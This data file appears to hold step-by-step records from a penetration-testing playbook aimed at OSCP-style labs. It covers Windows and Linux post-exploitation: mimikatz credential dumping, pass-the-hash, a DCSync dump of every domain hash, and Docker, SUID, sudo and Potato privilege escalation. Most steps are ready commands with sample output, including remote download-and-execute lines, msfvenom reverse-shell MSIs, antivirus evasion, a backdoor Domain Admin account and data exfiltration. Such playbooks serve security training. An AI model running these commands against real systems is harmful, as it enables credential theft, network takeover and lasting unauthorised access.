"enumerate-target","Post-Exploitation Enumeration","Gather system information and identify privilege escalation paths","Run enumeration commands: whoami /priv, whoami /groups, systeminfo, Get-Process, Get-Service, check for misconfigurations.
Gather information to identify privilege escalation paths.","",""
"extract-hashes","Extract Password Hashes","Dump NTLM hashes from compromised system using secretsdump or mimikatz","Use impacket-secretsdump against compromised host to extract local SAM, cached domain credentials, and LSA secrets.
Requires SYSTEM or local admin access.","",""
"parse-hashes","Parse and Format Hashes","Extract NTLM hash portion and verify format for pass-the-hash tools","Secretsdump output format: user:rid:lm:ntlm::: - extract 4th field (NTLM hash).
Verify hash is 32 hexadecimal characters.
Discard LM hash (3rd field) as it's rarely needed.","",""
"test-hash-validity","Verify Hash Validity","Test hash against target before full exploitation to confirm it works","Use CrackMapExec with -H flag to test hash authentication.
This quick test (2-3 seconds) prevents wasting time on invalid hashes.","",""
"spray-hash","Spray Hash Across Network","Test hash against multiple targets to identify all accessible systems","Use CrackMapExec to test hash against subnet (CIDR notation).
Local admin password reuse is common - same hash often grants access to multiple systems.","",""
"execute-pth-psexec","Execute Pass-the-Hash with PSExec","Use impacket-psexec with -hashes flag to gain SYSTEM shell on target","Run impacket-psexec with -hashes :NTLM_HASH format.
PSExec provides most stable shell and SYSTEM privileges immediately.","",""
"alternative-pth-wmi","Alternative: Pass-the-Hash with WMIExec","If PSExec fails or detected, use WMIExec as fileless alternative","WMIExec with -hashes provides fileless execution (no binary on disk).
Slightly slower than PSExec but stealthier.","",""
"alternative-pth-evil-winrm","Alternative: Pass-the-Hash with Evil-WinRM","If WinRM available, use Evil-WinRM for interactive PowerShell with hash","Evil-WinRM with -H flag provides richest interactive shell with file upload/download.
Requires WinRM enabled on target.","",""
"harvest-credentials","Harvest Credentials from Compromised System","Extract NTLM hashes from LSASS memory using mimikatz on compromised system with local admin","Use mimikatz to dump all cached credentials from LSASS memory on the compromised system. This step assumes you already have local administrator access on a domain-joined Windows system.

Prerequisites Check:
1. Confirm local admin: whoami /groups (look for BUILTIN\Administrators)
2. Confirm domain-joined: systeminfo | findstr /B /C:""Domain"" (should show domain name, not WORKGROUP)
3. Upload mimikatz.exe to writable directory (C:\temp, C:\Users\Public)

Mimikatz Execution:
1. Enable debug privilege: .\mimikatz.exe ""privilege::debug"" ""exit""
2. Verify output: 'Privilege '20' OK' (mandatory for LSASS access)
3. Dump credentials: .\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
4. Wait 5-10 seconds for dump to complete
5. Review output: type creds.txt | more

Expected Output Structure:
Authentication Id : 0 ; 123456
Session           : Interactive from 2 (or Service from 0, RemoteInteractive from 10)
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 11/24/2025 10:30:15 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
         * SHA1     : ...

Key Extraction Points:
- NTLM hash: 32 hexadecimal characters (this is what we need for PTH)
- Username: May be administrator, or other privileged accounts (svc_admin, it_admin, etc.)
- Domain: Confirms domain context (not local account)
- Session type: Service sessions persist longer (preferred targets)

Troubleshooting:
- ERROR 0x00000005: Forgot privilege::debug step, run again with privilege::debug
- No output/empty NTLM: WDigest disabled (Windows 8.1+), target older systems or use Kerberos tickets
- Only computer accounts: No user sessions cached, try different system or wait for user login
- AV quarantines mimikatz: Use obfuscated version, Invoke-Mimikatz (in-memory), or procdump+pypykatz

Alternative Methods:
- pypykatz: lsadump.py (Python alternative, no binary upload)
- procdump + offline parsing: procdump -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp
- Invoke-Mimikatz: IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz","",""
"extract-ntlm-hashes","Extract and Parse NTLM Hashes","Parse mimikatz output to extract NTLM hashes and map to usernames, prioritizing Domain Admin accounts","Parse the mimikatz output to extract NTLM hashes in correct format for Pass-the-Hash tools, and identify which accounts are Domain Admins.

Parsing Process:
1. Open creds.txt (mimikatz output from step 1)
2. Search for 'NTLM     :' lines
3. Extract hash (32 hex characters after 'NTLM     : ')
4. Extract corresponding Username and Domain from same section
5. Build credential list: DOMAIN\username:NTLMhash

Example Parsing:
Input (mimikatz output):
```
* Username : administrator
* Domain   : CORP
* NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Parsed Output:
CORP\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Automated Parsing (Linux):
grep -A 5 ""Username"" creds.txt | grep -E ""Username|Domain|NTLM"" > parsed.txt

Prioritization Strategy:
1. Identify Domain Admins: net group ""Domain Admins"" /domain (run on compromised system)
2. Cross-reference extracted usernames with Domain Admins list
3. Priority order:
   - Administrator (built-in Domain Admin, exists in every domain)
   - Domain Admin group members
   - Enterprise Admins (higher privileges, multi-domain)
   - IT/helpdesk accounts (often over-privileged)
   - Service accounts (svc_*, sql_*, backup_*)
4. Start with highest privilege accounts first

Hash Format Validation:
- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)
- Example valid hash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
- Invalid formats:
  - 40 characters = SHA1 (wrong type)
  - 16 characters = Half LM hash (incomplete)
  - 64 characters = SHA256 (wrong type)
  - Contains non-hex characters (corrupted)

Common Findings:
- 5-15 cached credentials on typical workstation
- At least 1-2 Domain Admin accounts (if workstation active)
- Computer accounts (HOSTNAME$) - ignore these for PTH
- Local accounts (domain = hostname) - ignore these, focus on DOMAIN\user

Troubleshooting:
- Multiple entries for same user: Use most recent (check Logon Time)
- No Domain Admin accounts: Target more systems, check servers instead of workstations
- Hash extraction fails: Manually copy from mimikatz output, ensure no whitespace
- Unsure if account is DA: Validate with crackmapexec in next step","",""
"validate-pth","Validate Pass-the-Hash Credentials","Test extracted NTLM hashes against Domain Controller to confirm they work and identify Domain Admin access","Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm Domain Admin privileges.

Validation Command:
crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>

Example:
crackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP

Expected Output (Success):
SMB         10.10.10.10     445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC01             [+] CORP\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)

Key Indicators:
- [+] = Authentication successful
- (Pwn3d!) = Domain Admin privileges confirmed (can write to C$ share on DC)
- If no (Pwn3d!): Valid credentials but NOT Domain Admin, test on other systems

Find Domain Controller:
If DC IP unknown:
1. From compromised system: nltest /dclist:CORP
2. Alternative: nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL
3. Alternative: nmap -p 88,389,636 10.10.10.0/24 (look for Kerberos + LDAP)
4. Get DC IP from mimikatz output (Logon Server field)

Test Multiple Credentials:
Create credential list file:
```
administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
it_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1
svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
```

Batch test:
for cred in $(cat creds.txt); do
  user=$(echo $cred | cut -d':' -f1)
  hash=$(echo $cred | cut -d':' -f2)
  crackmapexec smb <DC_IP> -u $user -H $hash -d CORP
done

Validation Criteria:
1. Authentication successful ([+])
2. Pwn3d indicator present (confirms DA)
3. SMB signing status noted (affects some attacks)
4. DC hostname and OS version identified

Troubleshooting:
- Connection timeout: Check network routing, firewall rules, DC online status
- Authentication failed [-]: Hash incorrect, account disabled, or account expired
- [+] but no Pwn3d: Valid user but NOT Domain Admin, can still use for lateral movement
- Account lockout: Test 1 credential at a time, wait between attempts
- SMB signing required: Doesn't affect PTH, but affects relay attacks

What if NO Domain Admin found:
1. Target more systems (servers more likely to have DA sessions)
2. Use Kerberoasting for service accounts
3. Check for Enterprise Admins (higher privileges)
4. Look for Backup Operators (have replication rights like DAs)
5. Proceed with standard user, attempt privilege escalation on DC

Success: At least 1 credential validates with Pwn3d indicator → proceed to DCSync","",""
"dcsync-execution","Execute DCSync to Dump All Domain Credentials","Use validated Domain Admin credentials to perform DCSync attack and extract ALL domain user hashes","Use impacket-secretsdump with Pass-the-Hash to perform DCSync attack, which simulates domain controller replication to extract all domain user NTLM hashes.

DCSync Command:
impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<DC_IP>

Example:
impacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10

IMPORTANT SYNTAX:
- Hash format: ':<NTLM>' (colon prefix, no LM hash)
- Domain/user format: 'DOMAIN/username' (forward slash)
- Target: DC IP or hostname
- No spaces around colon in hash parameter

Expected Output:
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: abcdef1234567890abcdef1234567890
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1:::
CORP.LOCAL\user1:1104:aad3b435b51404eeaad3b435b51404ee:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2:::
[... continues for all domain users ...]

Output Parsing:
Format: username:RID:LM_hash:NTLM_hash:::
- username: Domain user account
- RID: Relative Identifier (500 = Administrator, 502 = krbtgt)
- LM_hash: Legacy hash (usually aad3b435... = empty/disabled)
- NTLM_hash: This is what we need for Pass-the-Hash

Key Targets in Output:
1. Administrator (RID 500): Built-in domain admin, always exists
2. krbtgt (RID 502): Used for Golden Ticket creation (persistence)
3. Domain Admin members: Check 'net group ""Domain Admins"" /domain' output
4. Service accounts: svc_*, sql_*, backup_* (often reused passwords)

Save Output:
impacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10 > domain_hashes.txt

Execution Time:
- Small domain (< 100 users): 1-2 minutes
- Medium domain (100-1000 users): 3-5 minutes
- Large domain (> 1000 users): 5-10 minutes

Troubleshooting:
- 'STATUS_ACCESS_DENIED': Credentials not Domain Admin, revalidate in step 3
- Connection timeout: Check network, try alternative DC
- 'RemoteRegistry service failed': May still work, wait for full execution
- Partial output: Network interruption, re-run command
- 'Clock skew too great': Sync attacker time with domain (ntpdate <DC_IP>)

WHY THIS WORKS:
- DCSync uses MS-DRSR protocol (legitimate replication)
- Domain Admins have 'Replicating Directory Changes All' right by default
- DC treats request as legitimate replication from another DC
- Returns NTLM hashes for ALL domain users (even non-DA accounts)
- Stealth: Appears as normal replication in logs (hard to detect without SIEM)

Success: Complete list of domain hashes saved to file, proceed to extract Administrator hash","",""
"extract-administrator-hash","Extract Administrator Hash from DCSync Output","Parse DCSync output to extract Administrator NTLM hash for Domain Controller access","Parse the secretsdump output to extract the Administrator account NTLM hash, which will be used for Pass-the-Hash access to the Domain Controller.

Parsing Process:
1. Open domain_hashes.txt (secretsdump output from step 4)
2. Search for line starting with 'Administrator:500:'
3. Extract NTLM hash (4th field, after third colon)

Example Line:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::

Fields breakdown:
- Administrator: Username
- 500: RID (Relative Identifier, 500 is always built-in Administrator)
- aad3b435b51404eeaad3b435b51404ee: LM hash (empty/disabled, ignore this)
- a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6: NTLM hash (THIS IS WHAT WE NEED)

Extraction Methods:

Manual:
grep ""Administrator:500:"" domain_hashes.txt
Copy 4th field (NTLM hash)

Automated (bash):
grep ""Administrator:500:"" domain_hashes.txt | cut -d':' -f4

Automated (python):
python3 -c ""import sys; line = [l for l in open('domain_hashes.txt') if 'Administrator:500:' in l][0]; print(line.split(':')[3])""

Validation:
- Hash is exactly 32 hexadecimal characters
- Hash is NOT 'aad3b435b51404ee...' (that's the empty LM hash)
- Hash is NOT '31d6cfe0d16ae931b73c59d7e0c089c0' (that's empty password hash)

Additional Hashes to Extract:
1. krbtgt (RID 502): For Golden Ticket creation (persistence)
2. Domain Admin members: For alternative access
3. Service accounts: For additional persistence

Example extraction script:
```bash
#!/bin/bash
echo ""[+] Extracting key hashes from DCSync output""
echo """"
echo ""[*] Administrator hash:""
grep ""Administrator:500:"" domain_hashes.txt | cut -d':' -f4
echo """"
echo ""[*] krbtgt hash (for Golden Ticket):""
grep ""krbtgt:502:"" domain_hashes.txt | cut -d':' -f4
echo """"
echo ""[*] All Domain Admins:""
for user in $(net group ""Domain Admins"" /domain | grep -v ""^The command"" | grep -v ""^Domain Admins"" | grep -v ""^-"" | grep -v ""^$""); do
  grep -i ""^$user:"" domain_hashes.txt | cut -d':' -f1,4
done
```

Save Extracted Hash:
echo ""Administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"" > admin_hash.txt

Troubleshooting:
- Multiple Administrator entries: Use RID 500 (built-in), ignore renamed accounts
- Hash is empty password hash: Account has blank password, still works for PTH
- Can't find Administrator: Try alternative names (admin, administrator.domain)
- File encoding issues: Use 'cat -A' to check for hidden characters

Success: Administrator NTLM hash extracted and validated → proceed to DC access","",""
"pth-to-dc","Pass-the-Hash to Domain Controller","Use extracted Administrator hash to access Domain Controller and retrieve proof of domain compromise","Use Pass-the-Hash with extracted Administrator hash to access the Domain Controller and retrieve flags/proof of compromise.

Access Methods:

1. Evil-WinRM (Preferred for interactive shell):
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>

Example:
evil-winrm -i 10.10.10.10 -u Administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

2. PSExec (For SYSTEM shell):
impacket-psexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

Example:
impacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 Administrator@10.10.10.10

3. WMIExec (Stealthier, no service creation):
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

4. SMBExec (Alternative):
impacket-smbexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

Verification Steps:
1. Confirm successful authentication (prompt appears)
2. Verify user: whoami (should be DOMAIN\Administrator or NT AUTHORITY\SYSTEM)
3. Verify DC: hostname (should match DC hostname)
4. Confirm domain rights: net group ""Domain Admins"" /domain (verify membership)

Flag Retrieval:
1. Navigate to typical flag locations:
   - C:\Users\Administrator\Desktop\proof.txt
   - C:\Users\Administrator\Desktop\flag.txt
   - C:\Users\Administrator\Desktop\root.txt
   - C:\root.txt
2. Read flag: type C:\Users\Administrator\Desktop\proof.txt
3. Document access:
   whoami /all > C:\temp\proof_of_access.txt
   systeminfo >> C:\temp\proof_of_access.txt
   ipconfig /all >> C:\temp\proof_of_access.txt
4. Download proof: download C:\temp\proof_of_access.txt (Evil-WinRM)

Post-Exploitation Actions:

1. Create Persistence:
   - Golden Ticket: Use krbtgt hash from step 5
   - Create backdoor DA: net user backdoor Password123! /add /domain && net group ""Domain Admins"" backdoor /add /domain
   - Schedule task: schtasks /create /tn ""Windows Update"" /tr ""C:\temp\backdoor.exe"" /sc onstart /ru SYSTEM

2. Additional Enumeration:
   - List all DAs: net group ""Domain Admins"" /domain
   - List all computers: net group ""Domain Computers"" /domain
   - List all users: net user /domain
   - Forest information: nltest /domain_trusts

3. Data Exfiltration:
   - AD database: Copy C:\Windows\NTDS\ntds.dit (requires volume shadow copy)
   - SYSVOL: Copy \\<DC>\SYSVOL (Group Policy, scripts)
   - Registry hives: reg save HKLM\SAM C:\temp\sam.hive

4. Lateral Movement:
   - Use Administrator hash for Pass-the-Hash to ALL domain computers
   - Access all C$ shares: dir \\<hostname>\C$
   - Execute commands remotely: wmic /node:<hostname> process call create ""cmd.exe /c whoami""

Troubleshooting:
- Connection refused: Check WinRM/SMB ports (5985, 5986, 445)
- Authentication fails: Verify hash correctness, check account status
- Access denied to flags: Check alternative locations, verify user privileges
- DC unreachable: Check network routing, firewall rules, DC online status

Timeline Documentation:
- Initial foothold: [timestamp]
- Local admin on workstation: [timestamp]
- Credential harvest: [timestamp]
- DCSync execution: [timestamp]
- Domain Admin on DC: [timestamp]
- Total time: X minutes

SUCCESS: You've achieved complete domain compromise using Pass-the-Hash and DCSync, WITHOUT cracking a single password!","",""
"verify-docker-group","Verify Docker Group Membership","Check if current user is in docker group","Run groups and id commands to confirm docker group membership.

User must be in docker group to execute docker commands without sudo.

This is the prerequisite for all Docker escape techniques.","",""
"check-docker-socket","Check Docker Socket Access","Verify access to Docker socket and test if docker commands work","Check permissions on /var/run/docker.sock and test docker ps command.

Socket must be readable/writable by user or docker group.

This confirms docker group membership is effective and daemon is accessible.","",""
"check-available-images","List Available Docker Images","Enumerate available Docker images to use for container escape","Run docker images to see locally cached images.

Prefer using existing images to avoid network traffic/logging.

If no images available, alpine is smallest option (5MB).
Any Linux image works for mount escape.","",""
"mount-host-escape","Execute Docker Mount Escape","Mount host filesystem in container and chroot to gain root access","Run docker with -v /:/mnt to mount entire host filesystem at /mnt inside container.

Then chroot /mnt to change root directory to host filesystem.

This gives full root access to host from inside container.

Use smallest available image (alpine preferred).","",""
"verify-root","Verify Root Access to Host","Confirm full root access to host filesystem and sensitive files","Test access to root-only files:
- /mnt/etc/shadow (password hashes)
- /mnt/root directory
- /mnt/root/.ssh/id_rsa (SSH key)

Success confirms complete host compromise.

Can now read any file, modify any file, plant backdoors.","",""
"quick-wins-check","Quick Wins Check (Sudo Privileges)","Check for instant root via sudo before time-consuming SUID enumeration","OSCP time-saving: Always check sudo first (5 seconds) before SUID enumeration (2+ minutes).

If user has NOPASSWD sudo, instant root without complex exploitation.","",""
"find-suid","Enumerate SUID Binaries","Locate all SUID binaries on system using find command","Search entire filesystem for files with SUID bit set (-perm -4000).

Redirect errors to /dev/null to avoid permission denied noise.","",""
"filter-interesting","Identify Exploitable SUID Binaries","Filter out standard system binaries and focus on exploitable candidates","Exclude common system binaries (passwd, sudo, ping, mount) that are expected to have SUID.

Look for:
- find, vim, nmap
- base64, less, more
- python, perl, awk
- Custom application binaries","",""
"check-gtfobins","Lookup GTFOBins Exploitation Technique","Find exploitation technique for discovered SUID binary on GTFOBins website","Visit https://gtfobins.github.io/ and search for binary name.

Look for 'SUID' section specifically.

Copy exploitation command syntax.","",""
"exploit-suid","Execute SUID Exploitation","Run GTFOBins command to escalate privileges and spawn root shell","Execute exploitation command exactly as documented on GTFOBins.

Common example:
/usr/bin/find . -exec /bin/bash -p \; -quit","",""
"verify-root","Verify Root Access","Confirm effective UID is 0 and full root privileges obtained","Run whoami and id commands to verify root access.

Check if you can read /etc/shadow or /root/ directory.","",""
"check-sudo-privs","Check Sudo Privileges","Identify what commands current user can run with sudo privileges","Run 'sudo -l' to list allowed commands.

Look for:
- NOPASSWD entries (no password required)
- GTFOBins-exploitable binaries
- Dangerous env_keep settings

Parser extracts exploitable configurations automatically.","",""
"analyze-sudoers","Analyze Sudoers Configuration","Identify exploitable sudo configurations from parser output","Review parsed findings for:

1. NOPASSWD entries - no password needed
2. GTFOBins binaries - spawn shells or read files
3. Wildcards - command injection opportunities
4. env_keep=LD_PRELOAD - shared library injection

Parser auto-identifies exploitable binaries from GTFOBins database.","",""
"research-technique","Research GTFOBins Exploitation Technique","Find specific sudo exploitation technique for discovered binary","Visit https://gtfobins.github.io/ and search for the binary name.

Navigate to 'Sudo' section for exploitation commands.
Copy exact syntax including flags.

Common techniques:
1. Shell spawning (find, vim, less)
2. File reading (base64, xxd)
3. Command execution (python, perl, awk)","",""
"exploit-sudo","Execute Sudo Exploitation","Run sudo command with GTFOBins technique to escalate privileges","Execute exploitation command exactly as documented.

Exploitation patterns:
- Shell spawning: sudo <binary> <flags>
- File reading: sudo <binary> /etc/shadow
- Command execution: sudo <binary> -c 'import os; os.system(""/bin/bash"")'

Verify root shell spawned with correct privileges.","",""
"verify-root","Verify Root Access","Confirm effective UID is 0 and full root privileges obtained","Run whoami, id, and attempt to read /etc/shadow to confirm root access.

Verification steps:
- Check both real UID and effective UID
- Verify filesystem access to root-only files
- Test ability to read sensitive files
- Confirm access to /root directory","",""
"enumerate-capabilities","Enumerate File Capabilities","Find all binaries with capabilities set on the system","Use getcap to recursively search the filesystem for binaries with Linux capabilities.

Capabilities grant specific elevated permissions without requiring full SUID root.

This step identifies potential privilege escalation vectors by locating binaries with dangerous capabilities.","",""
"identify-exploitable","Identify Exploitable Capabilities","Filter enumerated capabilities to identify those that enable privilege escalation","Analyze discovered capabilities to identify dangerous ones that enable privilege escalation.

Focus on:
- cap_setuid (spawn root shell)
- cap_dac_override (edit any file)
- cap_dac_read_search (read sensitive files)
- cap_sys_admin (mount filesystems)
- cap_sys_ptrace (inject code into processes)

Cross-reference binaries against GTFOBins database for documented exploitation techniques.","",""
"research-technique","Research Exploitation Technique","Find documented exploitation technique for identified capability and binary combination","Consult GTFOBins capabilities section and HackTricks for specific exploitation techniques.

Each capability/binary combination requires different approach.

Examples:
- Python with cap_setuid uses os.setuid(0)
- vim with cap_dac_override edits /etc/passwd
- tar with cap_dac_read_search reads sensitive files

Document exact command syntax and expected behavior.","",""
"exploit-capability","Execute Capability Exploitation","Use identified capability to perform privileged operations and escalate privileges","Execute documented exploitation technique using the capability-enabled binary.

Exploitation methods by capability:
- cap_setuid: spawn root shell via setuid(0) syscall
- cap_dac_override: edit sensitive files like /etc/passwd to add UID 0 user
- cap_dac_read_search: read shadow file or SSH keys
- cap_sys_ptrace: inject shellcode into root process

Verify privileged operation succeeds.","",""
"verify-access","Verify Elevated Access","Confirm successful privilege escalation to root-level access","Verify escalated privileges by testing root-level operations.

Verification steps:
- Check effective UID with whoami and id commands
- Attempt to read /etc/shadow to confirm read access to sensitive files
- Try accessing /root directory or reading root SSH keys
- If root shell obtained, verify with shell prompt and environment variables

Document exact level of access achieved.","",""
"initial-enumeration","Basic System Enumeration","Gather system information to identify OS version, patch level, current user privileges, and group memberships","Run basic enumeration commands to establish baseline:

1. System Information:
   - OS version and architecture (x86 vs x64)
   - Patch level (missing hotfixes = kernel exploits)
   - Hostname and domain membership

2. User Context:
   - Current username (whoami)
   - User privileges (SeImpersonate, SeDebugPrivilege)
   - Group memberships (Administrators, Backup Operators)

3. Network Context:
   - IP configuration (ipconfig)
   - Network shares (net share)
   - Active connections (netstat)

WHY THIS MATTERS:
- OS version determines exploit compatibility
- User privileges reveal quick-win paths (Potato exploits)
- Group membership shows if UAC bypass needed vs full exploitation
- Architecture (x86/x64) affects payload selection

TIME ESTIMATE: 2-3 minutes","",""
"potato-privilege-check","Check for Potato Exploit Eligibility (QUICK WIN)","Verify if SeImpersonate or SeAssignPrimaryToken privilege is enabled, allowing token impersonation to SYSTEM","CRITICAL QUICK WIN CHECK:

Potato-family exploits are the #1 privilege escalation path for Windows service accounts.

PRIVILEGES TO LOOK FOR:
- SeImpersonatePrivilege (Impersonate a client after authentication)
- SeAssignPrimaryTokenPrivilege (Replace a process level token)

COMMON SCENARIOS WHERE THESE EXIST:
- IIS application pool accounts (IIS APPPOOL\DefaultAppPool)
- SQL Server service accounts (MSSQLSERVER, SQLSERVERAGENT)
- Local Service / Network Service accounts
- Any service running under custom user account

IF ENABLED → SYSTEM shell in 2-5 minutes guaranteed.

EXPLOIT VARIANTS (choose based on Windows version):
- JuicyPotato: Windows 7, 8, Server 2008-2016, Windows 10 < 1809
- RoguePotato: Windows 10 1809+, Server 2019+
- PrintSpoofer: Windows 10, Server 2019+ (simplest, recommended)
- SweetPotato: Universal (works on all versions)

VERIFICATION:
whoami /priv | findstr /i ""SeImpersonate SeAssignPrimaryToken""

Look for 'Enabled' status (not just 'Disabled' presence).","",""
"potato-exploitation","Execute Potato Exploit to SYSTEM","Exploit SeImpersonate privilege to spawn SYSTEM shell using PrintSpoofer, JuicyPotato, or equivalent","EXECUTION WORKFLOW:

1. Transfer exploit binary to target:
   - certutil -urlcache -f http://<LHOST>/PrintSpoofer.exe C:\temp\p.exe
   - OR: PowerShell download: (New-Object Net.WebClient).DownloadFile('http://<LHOST>/PrintSpoofer.exe','C:\temp\p.exe')
   - OR: SMB share: copy \\<LHOST>\share\PrintSpoofer.exe C:\temp\p.exe

2. Execute exploit:
   - PrintSpoofer: C:\temp\PrintSpoofer.exe -i -c cmd
   - JuicyPotato: C:\temp\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
   - SweetPotato: C:\temp\SweetPotato.exe -p cmd.exe -a '/c whoami'

3. Verify SYSTEM shell:
   - whoami (should return 'nt authority\system')
   - whoami /priv (should show ALL privileges enabled)

REVERSE SHELL ALTERNATIVE:
Instead of interactive cmd:
  PrintSpoofer.exe -c ""powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')""

CLSID SELECTION (for JuicyPotato):
- Windows 10 Enterprise: {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
- Windows 10 Pro: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
- Windows Server 2019: {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
- Full list: https://github.com/ohpe/juicy-potato/tree/master/CLSID

COMMON ISSUES:
- AV blocks exploit binary → Encode with base64 or use obfuscation
- Port 1337 in use → Change -l flag to different port
- CLSID doesn't work → Try different CLSID from GitHub list","",""
"automated-enumeration","Automated Privilege Escalation Enumeration","Run WinPEAS or PowerUp to comprehensively scan for privilege escalation vectors","AUTOMATED TOOLS FIND MISCONFIGURATIONS FASTER THAN MANUAL ENUMERATION:

1. WinPEAS (Recommended for OSCP):
   - Transfer: certutil -urlcache -f http://<LHOST>/winPEASany.exe C:\temp\w.exe
   - Execute: C:\temp\w.exe
   - Focus on RED/YELLOW findings (critical vulnerabilities)
   - Runtime: 30-60 seconds

2. PowerUp (PowerShell alternative):
   - Execute: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks
   - Fileless execution (no disk write)
   - May be blocked by AMSI (need bypass)
   - Runtime: 20-40 seconds

KEY FINDINGS TO LOOK FOR:
- Unquoted Service Paths (with spaces in path)
- AlwaysInstallElevated (registry keys set to 0x1)
- Modifiable Service Binaries (weak file permissions)
- Modifiable Service Config (SERVICE_CHANGE_CONFIG access)
- AutoLogon Credentials (registry stored passwords)
- Scheduled Tasks (writable scripts/binaries)
- Kernel Exploit Suggestions (missing patches)

OUTPUT INTERPRETATION:
WinPEAS uses color coding:
- RED = Critical (immediate exploitation path)
- YELLOW = High priority (likely exploitable)
- GREEN = Informational (context, not direct exploit)

PowerUp output:
- ServiceName, Description, AbuseFunction provided for each finding
- Use Invoke-ServiceAbuse for automatic exploitation

MANUAL ALTERNATIVE (if tools blocked):
Run individual checks from Step 4-9 manually.","",""
"alwaysinstallelevated-exploit","AlwaysInstallElevated Exploitation (QUICK WIN)","Exploit AlwaysInstallElevated registry setting to install malicious MSI as SYSTEM","ALWAYSINSTALLELEVATED = INSTANT SYSTEM SHELL:

REQUIREMENTS:
Both registry keys must be set to 0x1:
1. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
2. HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

VERIFICATION:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Both must return: AlwaysInstallElevated REG_DWORD 0x1

EXPLOITATION WORKFLOW:

1. Generate malicious MSI (on attacker machine):
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi > shell.msi

2. Transfer MSI to target:
   certutil -urlcache -f http://<LHOST>/shell.msi C:\temp\shell.msi

3. Start listener on attacker:
   nc -lvnp <LPORT>

4. Execute MSI on target:
   msiexec /quiet /qn /i C:\temp\shell.msi

5. Receive SYSTEM shell on listener:
   whoami → nt authority\system

FLAGS EXPLAINED:
- /quiet = No UI during installation
- /qn = Completely silent install (no dialogs)
- /i = Install package

CLEANUP:
del C:\temp\shell.msi

WHY THIS WORKS:
AlwaysInstallElevated is Group Policy setting intended for corporate environments where standard users need to install software. When enabled, ALL MSI installers run with SYSTEM privileges, even custom malicious ones.

COMMON IN:
- Poorly configured domain environments
- Development/test systems
- Legacy systems with relaxed security policies

TIME ESTIMATE: 3-5 minutes from verification to SYSTEM shell.","",""
"unquoted-service-check","Unquoted Service Path Exploitation","Identify and exploit services with unquoted paths containing spaces for privilege escalation","UNQUOTED SERVICE PATHS EXPLAINED:

VULNERABILITY:
Service path: C:\Program Files\My Service\service.exe (UNQUOTED)

Windows execution order when path contains spaces:
1. C:\Program.exe
2. C:\Program Files\My.exe  
3. C:\Program Files\My Service\service.exe

If attacker can write C:\Program.exe → Executes as SYSTEM when service starts.

ENUMERATION:
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v ""C:\\Windows\\\\"" | findstr /i /v """"""""

Look for:
- Auto-start services (restart on reboot)
- Paths with spaces (e.g., Program Files, Company Name)
- No quotes around path
